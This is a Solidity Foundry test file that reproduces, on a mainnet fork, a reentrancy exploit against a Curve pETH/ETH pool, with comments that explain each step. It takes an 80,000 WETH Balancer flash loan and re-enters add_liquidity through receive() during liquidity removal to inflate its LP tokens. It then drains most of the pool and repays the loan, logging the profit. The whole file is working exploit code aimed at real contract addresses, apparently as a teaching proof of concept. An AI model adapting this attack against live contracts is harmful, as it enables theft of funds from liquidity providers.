// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

interface IWETH is IERC20 {
    function deposit() external payable;

    function withdraw(uint256 amount) external;
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface ICurvePool {
    function get_balances() external view returns (uint256[2] memory);

    function exchange(
        int128 i,
        int128 j,
        uint256 dx,
        uint256 min_dy
    ) external payable returns (uint256);

    function add_liquidity(
        uint256[2] memory amounts,
        uint256 min_mint_amount
    ) external payable returns (uint256);

    function remove_liquidity(
        uint256 token_amount,
        uint256[2] memory min_amounts
    ) external;
}

contract CurveHack is Test {
    IBalancerVault BalancerVault =
        IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    ICurvePool CurvePool =
        ICurvePool(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);
    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 pETH = IERC20(0x836A808d4828586A69364065A1e064609F5078c7);
    IERC20 LPToken = IERC20(0x9848482da3Ee3076165ce6497eDA906E66bB85C5);

    bool addLiquidityInReentrancy = true;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_806_055);
    }

    function testHack() external {
        // Foundry-specific function to reset ETH balance of this contract to 0
        // when running the test
        deal(address(this), 0);

        // Tell Balancer we want 80,000 WETH from them
        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(WETH);
        amounts[0] = 80000 ether;

        // Request the flash loan
        // This function call will also call `receiveFlashLoan`
        // that we will write shortly
        BalancerVault.flashLoan(address(this), tokens, amounts, "");

        // By the time the above function returns, the flash loan will be paid back
        // and the exploit will be complete
        // So we can see how much ETH we are still left with, which is pure profits
        emit log_named_decimal_uint(
            "ETH in Profits: ",
            address(this).balance,
            18
        );
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) external {
        // Convert the 80k WETH we have received to 80k ETH
        WETH.withdraw(WETH.balanceOf(address(this)));

        logValues("Before Add Liquidity #1");

        // Step 1. Add liquidity to pool
        uint256[2] memory addLiquidityAmounts = [
            uint256(40_000 ether), // 40k ETH
            uint256(0) // 0 pETH
        ];
        CurvePool.add_liquidity{value: 40_000 ether}(addLiquidityAmounts, 0);

        logValues("After Add Liquidity #1");

        // Step 2. Remove liquidity from pool
        uint256[2] memory minAmountsReceived = [uint256(0), uint256(0)];
        uint256 lpTokenBalance = LPToken.balanceOf(address(this));
        CurvePool.remove_liquidity(lpTokenBalance, minAmountsReceived);

        logValues("After Remove Liquidity #1");

        // Step 6. Remove almost 100% of the liquidity from the pool
        // as we now have more LP tokens than the pool thinks are even
        // in existence
        uint256 curvePoolLPTotalSupply = LPToken.totalSupply();
        uint256 myLPTokenSupply = LPToken.balanceOf(address(this));
        assert(myLPTokenSupply > curvePoolLPTotalSupply);

        uint256 liquidityToRemove = curvePoolLPTotalSupply - 1000 ether;
        CurvePool.remove_liquidity(liquidityToRemove, minAmountsReceived);

        logValues("After Remove Liquidity #2");

        // Step 7. Swap any pETH to ETH
        pETH.approve(address(CurvePool), pETH.balanceOf(address(this)));
        CurvePool.exchange(1, 0, pETH.balanceOf(address(this)), 0);

        logValues("After swapping pETH for ETH");

        // Deposit ETH into WETH and pay back flash loan
        WETH.deposit{value: 80000 ether}();
        WETH.transfer(address(BalancerVault), 80000 ether);
    }

    receive() external payable {
        // Only execute if being called from the Curve Pool address
        // and we haven't already done the exploit
        // Since receive() will be called again when we remove liquidity
        // the second time
        if (msg.sender == address(CurvePool) && addLiquidityInReentrancy) {
            logValues("ReEntrancy - Before Add Liquidity #2");

            // Step 3. Add liquidity to pool again
            uint256[2] memory addLiquidityAmounts = [
                uint256(40_000 ether), // 40k ETH
                uint256(0) // 0 pETH
            ];

            CurvePool.add_liquidity{value: 40_000 ether}(
                addLiquidityAmounts,
                0
            );

            // Mark the exploit as having happened
            // so we don't do it again as it would be useless
            addLiquidityInReentrancy = false;

            logValues("ReEntrancy - After Add Liquidity #2");
        }
    }

    function logValues(string memory key) internal {
        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve LP Total Supply")),
            LPToken.totalSupply(),
            LPToken.decimals()
        );

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve ETH Balance")),
            CurvePool.get_balances()[0],
            18
        );

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Curve pETH Balance")),
            CurvePool.get_balances()[1],
            pETH.decimals()
        );

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker LP Balance")),
            LPToken.balanceOf(address(this)),
            LPToken.decimals()
        );

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker ETH Balance")),
            address(this).balance,
            18
        );

        emit log_named_decimal_uint(
            string(abi.encode(key, ": Attacker pETH Balance")),
            pETH.balanceOf(address(this)),
            pETH.decimals()
        );

        emit log("=====================================================");
    }
}